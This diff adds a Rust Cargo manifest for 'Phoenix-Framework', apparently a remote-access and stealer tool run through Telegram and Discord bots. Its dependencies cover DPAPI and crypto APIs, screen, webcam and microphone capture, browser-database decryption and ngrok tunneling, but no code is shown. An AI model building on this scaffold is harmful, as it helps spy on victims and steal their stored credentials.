@@ -1,0 +1,60 @@
+[package]
+name = "Phoenix-Framework"
+version = "0.1.0"
+edition = "2024"
+
+[[bin]]
+
+name = "telegram"
+path = "src/telegram.rs"
+
+[[bin]]
+
+name = "discord"
+path = "src/discord.rs"
+
+
+
+[dependencies]
+
+anyhow = "1.0"
+winapi = { version = "0.3", features = ["memoryapi", "namedpipeapi", "shellapi", "tlhelp32", "securitybaseapi", "wincrypt", "winbase","dpapi", "winuser", "processthreadsapi", "handleapi", "errhandlingapi", "winnt"] }
+
+teloxide = "0.17.0"
+serenity = { version = "0.12.5", default-features = false, features = ["default_native_tls"]}
+
+tokio = { version = "1.49.0", features = ["full"] }
+reqwest = { version = "0.11", features = ["blocking", "json", "stream"] }
+axum = "0.8.8"
+serde_json = "1.0.149"
+glob = "0.3.3"
+futures = "0.3.32"
+rand = "0.8"
+
+wmi = "0.18.3"
+
+#screenshots
+scrap = "0.5"
+image = { version = "0.25", features = ["jpeg", "png"] }
+
+nokhwa = {version = "0.10.10", features = ["input-native", "output-wgpu"]}
+cpal = "0.17.3"
+hound = "3.5.1"
+
+
+#browser
+aes-gcm = "0.10.3"
+rusqlite = { version = "0.38.0", features = ["bundled"] }
+#windows-sys ={version = "0.61", features = ["Win32_Security","Win32_Security_Cryptography"]}
+base64 = "0.22.0"
+hex = "0.4.3"
+
+# Tunneling
+ngrok = "0.18.0"
+url = "2.5.8"
+bytes = "1.11.1"
+async-stream = "0.3.6"
+tokio-stream = "0.1"
+
+winreg = "0.10"
+chrono = "0.4.44"
